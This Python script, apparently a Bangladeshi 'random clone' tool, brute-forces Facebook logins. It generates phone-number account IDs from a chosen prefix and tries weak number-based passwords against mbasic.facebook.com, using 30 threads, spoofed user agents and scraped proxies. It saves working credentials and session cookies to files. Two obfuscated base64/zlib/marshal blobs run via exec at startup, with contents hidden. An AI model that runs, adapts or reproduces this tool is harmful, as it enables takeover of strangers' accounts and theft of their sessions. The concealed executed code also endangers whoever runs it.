#Script рждрзЛ ржирж┐рждрзЗ ржЖрж╕рж▓рж╛ ржПржХрж╛ржЙржирзНржЯ ржЯрж╛ ржлрж▓рзЛ ржХрж░рж▓рзЗ ржХрж┐ рж╣рзЯ рж╣рзБржоЁЯШХ
#ржПржХрж╛ржЙржирзНржЯ ржлрж▓рзЛ ржЖрж░ ржПржЗ Respotary рждрзЗ ржПржХржЯрж╛ Star ржжрж┐рзЯрж╛ ржпрж╛ржЗржУЁЯШК
#----------------------------------------------------------------------------------------------------------
#CREATE BY : BAYEZID 
#WHATSAPP : +8801326226582
#GITHUB : https://github.com/Bayezid-400
#----------------------------------------------------------------------------------------------------------
import os,sys,time,json,random,re,string,platform,base64,uuid,marshal, base64, zlib; exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJx7zIAEmKH0ZxkgMZ2BiSGVIYVhGSMDw2pGmBJGhhTGYAZNplJLIEc62tDa0ig3Gkwb5j6aMxkqEqsQ7BzkGRCi4Bzk6OIZouAb6gskPYN9HH0VPDx9Q/00GW+xFhRl5pWsZPgMMvYXj6efn7+zq1+IgpN/5C8Om9z8lNKcVLsiNrCdDAzFICd9YGZkZLzBwNrAeoHN6yKD9xUG7wswVMQCVAAAK8Mupg=='))))
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 import marshal,zlib,random
ugen=[]
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=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'))
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='XQ-DQ72 Build/67.1.A.2.112; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,120)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	uaku2=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
logo = ("""\033[1;37m  
                                         ___      ___   ___             
    //   ) )  // | | \\    / / //   / /     / /      / /    //    ) )   
   //___/ /  //__| |  \\  / / //____       / /      / /    //    / /    
  / __  (   / ___  |   \\/ / / ____       / /      / /    //    / /     
 //    ) ) //    | |    / / //           / /      / /    //    / /      
//____/ / //     | |   / / //____/ /    / /___ __/ /___ //____/ /       
                                                                
==================================================
[тАв] AUTHOR    : BAYEZID 
[тАв] TOOLS     : RANDOM CLONE
[тАв] TYPE      : FREE
[тАв] FACEBOOK  : BAYEZID 
[тАв] WHATSAPP  : +8801326226582
==================================================""")

logo1 = ("""\033[1;37m  
.______        ___   ____    ____  _______  ________   __   _______     
|   _  \      /   \  \   \  /   / |   ____||       /  |  | |       \    
|  |_)  |    /  ^  \  \   \/   /  |  |__   `---/  /   |  | |  .--.  |   
|   _  <    /  /_\  \  \_    _/   |   __|     /  /    |  | |  |  |  |   
|  |_)  |  /  _____  \   |  |     |  |____   /  /----.|  | |  '--'  |   
|______/  /__/     \__\  |__|     |_______| /________||__| |_______/    
                                                                       
==================================================""")

def mumitx():
	print('==================================================')

def Main():
        os.system("clear")
        print(logo)
        print(" [1] RANDOM CRACK")
        print(" [0] Exit")
        Mumit =input("\n [?] Choose : ")
        if Mumit in ["1","01"]:
            fuck()
        if Mumit in [" 0", "00"]:
            exit()
        else:
            exit()
            
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] EXAMPLE CODE: 017, 018, 019, 016' )
    code = input('[?] CHOOSE CODE : ')
    os.system('clear')
    print(logo)
    print('[+] EXAMPLE: 2000 3000 5000 10000 ')
    limit = int(input('[?] CHOOSE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo1)
        tl = str(len(user))
        print('[+] Total ids: '+tl)
        print("[+] Your Code: "+code)
        print('[+] Process has been started')
        print('[+] Use flight mode for speed up')
        print('==================================================')
        for guru in user:
            uid = code+guru
            pwx = [guru,uid,uid[:7],uid[:6],'bangladesh']
            yaari.submit(mumit2,uid,pwx,tl)
    print(mumitx)
    print(' [+] Crack process has been completed')
    print(' [+] OK Ids saved in IDFC/OK.txt')
    print(' [+] CP Ids saved in IDFC/CP.txt')
    print(mumitx)
       
def mumit2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[1;92m[IDFC]├Ч[%s/%s]├Ч[OK-%s]├Ч[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
    'method':'GET',
            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
            'scheme':'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"220333QAG"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[IDFC-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/IDFC/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[IDFC-CP] {cid}|{ps}")
                open('/sdcard/IDFC-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()